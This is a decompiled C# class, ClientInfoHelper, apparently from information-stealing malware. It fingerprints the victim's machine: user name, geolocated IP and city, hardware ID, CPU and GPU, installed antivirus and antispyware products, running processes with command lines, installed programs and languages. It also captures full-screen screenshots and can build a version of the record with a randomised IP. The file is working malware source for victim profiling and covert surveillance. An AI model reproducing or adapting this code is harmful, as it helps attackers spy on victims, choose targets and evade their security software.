using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Windows.Forms;
using Microsoft.Win32;
using NoiseMe.Drags.App.Data.WMI;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;

namespace NoiseMe.Drags.App.Models.LocalModels
{
	// Token: 0x02000137 RID: 311
	public static class ClientInfoHelper
	{
		// Token: 0x0600098E RID: 2446 RVA: 0x0001F7AC File Offset: 0x0001D9AC
		public static RemoteClientInformation Create(string SourceID)
		{
			RemoteClientInformation result;
			try
			{
				GeoLocationHelper.Initialize();
				Size screenSize = ClientInfoHelper.GetScreenSize();
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				result = new RemoteClientInformation
				{
					ID = 0,
					LogTime = DateTime.Now,
					SourceID = SourceID,
					UserName = Environment.UserName,
					ClientIP = GeoLocationHelper.GeoInfo.Query,
					Country = GeoLocationHelper.GeoInfo.CountryCode,
					OperationSystem = ClientInfoHelper.ParseOS(),
					HardwareID = ClientInfoHelper.ParseHWID(),
					Hardwares = ClientInfoHelper.ParseHardwares(),
					Antiviruses = ClientInfoHelper.ParseDefenders(),
					Languages = ClientInfoHelper.AvailableLanguages(),
					CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
					MonitorSize = string.Format("{0}x{1}", screenSize.Width, screenSize.Height),
					TimeZone = "UTC" + text,
					City = GeoLocationHelper.GeoInfo.City
				};
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600098F RID: 2447 RVA: 0x0001F900 File Offset: 0x0001DB00
		public static List<RemoteProcess> ListOfProcesses()
		{
			List<RemoteProcess> list = new List<RemoteProcess>();
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process Where SessionId='{0}'", Process.GetCurrentProcess().SessionId)))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							try
							{
								RemoteProcess remoteProcess = new RemoteProcess();
								object obj = managementObject["ProcessId"];
								remoteProcess.ProcessID = Convert.ToInt32((obj != null) ? obj.ToString() : null);
								object obj2 = managementObject["CommandLine"];
								remoteProcess.ProcessCommandLine = ((obj2 != null) ? obj2.ToString() : null);
								object obj3 = managementObject["Name"];
								remoteProcess.ProcessName = ((obj3 != null) ? obj3.ToString() : null);
								remoteProcess.ProcessUsername = Environment.MachineName + "\\" + Environment.UserName;
								RemoteProcess item = remoteProcess;
								list.Add(item);
							}
							catch (Exception value)
							{
								Console.WriteLine(value);
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000990 RID: 2448 RVA: 0x0001FA94 File Offset: 0x0001DC94
		public static List<string> ListOfPrograms()
		{
			List<string> list = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					foreach (string name in registryKey.GetSubKeyNames())
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null);
							if (!string.IsNullOrEmpty(text))
							{
								list.Add(text);
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000991 RID: 2449 RVA: 0x0001FB50 File Offset: 0x0001DD50
		public static List<string> AvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (object obj in InputLanguage.InstalledInputLanguages)
				{
					InputLanguage inputLanguage = (InputLanguage)obj;
					list.Add(inputLanguage.Culture.EnglishName);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000992 RID: 2450 RVA: 0x0001FBCC File Offset: 0x0001DDCC
		public static string GetCommandLine(Process process)
		{
			string result;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							object obj = enumerator.Current["CommandLine"];
							return (obj != null) ? obj.ToString() : null;
						}
					}
					result = "";
				}
			}
			return result;
		}

		// Token: 0x06000993 RID: 2451 RVA: 0x0001FC7C File Offset: 0x0001DE7C
		private static List<Hardware> ParseHardwares()
		{
			List<Hardware> list = new List<Hardware>();
			try
			{
				foreach (Processor processor in HardwareGatherer.GetProcessors())
				{
					list.Add(new Hardware
					{
						Caption = processor.Name,
						Parameter = processor.NumberOfCores.ToString(),
						HardType = HardwareType.Processor
					});
				}
				foreach (GraphicsCard graphicsCard in HardwareGatherer.GetGraphicsCards())
				{
					list.Add(new Hardware
					{
						Caption = graphicsCard.Name,
						Parameter = graphicsCard.MemoryCapacity.ToString(),
						HardType = HardwareType.Graphic
					});
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000994 RID: 2452 RVA: 0x0001FD88 File Offset: 0x0001DF88
		private static string ParseOS()
		{
			string result;
			try
			{
				result = OsGatherer.GetCaption() + " " + OsGatherer.GetOSArchitecture();
			}
			catch
			{
				result = "UNKNOWN";
			}
			return result;
		}

		// Token: 0x06000995 RID: 2453 RVA: 0x0001FDC8 File Offset: 0x0001DFC8
		private static string ParseHWID()
		{
			string result;
			try
			{
				result = DataRecoveryHelper.GetMd5Hash(HardwareGatherer.GetHwid(HwidStrength.Strong, true)).Replace("-", string.Empty);
			}
			catch
			{
				result = "UNKNOWN";
			}
			return result;
		}

		// Token: 0x06000996 RID: 2454 RVA: 0x0000746A File Offset: 0x0000566A
		public static byte[] CaptureScreen()
		{
			return ClientInfoHelper.ImageToByte(ClientInfoHelper.GetScreenshot());
		}

		// Token: 0x06000997 RID: 2455 RVA: 0x0001FE10 File Offset: 0x0001E010
		private static Bitmap GetScreenshot()
		{
			Bitmap result;
			try
			{
				Size screenSize = ClientInfoHelper.GetScreenSize();
				Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.Bicubic;
					graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), screenSize);
				}
				result = bitmap;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000998 RID: 2456 RVA: 0x0001FE9C File Offset: 0x0001E09C
		private static byte[] ImageToByte(Image img)
		{
			byte[] result;
			try
			{
				if (img == null)
				{
					result = null;
				}
				else
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						img.Save(memoryStream, ImageFormat.Png);
						result = memoryStream.ToArray();
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000999 RID: 2457 RVA: 0x0001FEF8 File Offset: 0x0001E0F8
		private static Size GetScreenSize()
		{
			return Screen.PrimaryScreen.Bounds.Size;
		}

		// Token: 0x0600099A RID: 2458 RVA: 0x0001FF18 File Offset: 0x0001E118
		public static List<string> ParseDefenders()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(ClientInfoHelper.ParseAntiViruses().IsNull(new List<string>()));
				foreach (string item in ClientInfoHelper.ParseSpyWares().IsNull(new List<string>()))
				{
					if (!list.Contains(item))
					{
						list.Add(item);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600099B RID: 2459 RVA: 0x0001FFA4 File Offset: 0x0001E1A4
		public static IEnumerable<string> ParseAntiViruses()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct securityProduct in SecurityGatherer.GetSecurityProducts(SecurityProductType.AntiVirus))
				{
					list.Add(securityProduct.Name);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600099C RID: 2460 RVA: 0x00020010 File Offset: 0x0001E210
		private static IEnumerable<string> ParseSpyWares()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct securityProduct in SecurityGatherer.GetSecurityProducts(SecurityProductType.AntiSpyware))
				{
					list.Add(securityProduct.Name);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600099D RID: 2461 RVA: 0x0002007C File Offset: 0x0001E27C
		private static string RandomIp()
		{
			return string.Format("{0}.{1}.{2}.{3}", new object[]
			{
				ClientInfoHelper.rnd.Next(1, 255),
				ClientInfoHelper.rnd.Next(0, 255),
				ClientInfoHelper.rnd.Next(0, 255),
				ClientInfoHelper.rnd.Next(0, 255)
			});
		}

		// Token: 0x0600099E RID: 2462 RVA: 0x000200FC File Offset: 0x0001E2FC
		public static RemoteClientInformation CreateRandom(string SourceID)
		{
			RemoteClientInformation result;
			try
			{
				GeoLocationHelper.Initialize();
				Size screenSize = ClientInfoHelper.GetScreenSize();
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				result = new RemoteClientInformation
				{
					ID = 0,
					LogTime = DateTime.Now,
					SourceID = SourceID,
					UserName = Environment.UserName,
					ClientIP = ClientInfoHelper.RandomIp(),
					Country = GeoLocationHelper.GeoInfo.CountryCode,
					OperationSystem = ClientInfoHelper.ParseOS(),
					HardwareID = ClientInfoHelper.ParseHWID(),
					Hardwares = ClientInfoHelper.ParseHardwares(),
					Antiviruses = ClientInfoHelper.ParseDefenders(),
					Languages = ClientInfoHelper.AvailableLanguages(),
					CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
					MonitorSize = string.Format("{0}x{1}", screenSize.Width, screenSize.Height),
					TimeZone = "UTC" + text,
					City = GeoLocationHelper.GeoInfo.City
				};
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x040003A4 RID: 932
		private static Random rnd = new Random();
	}
}
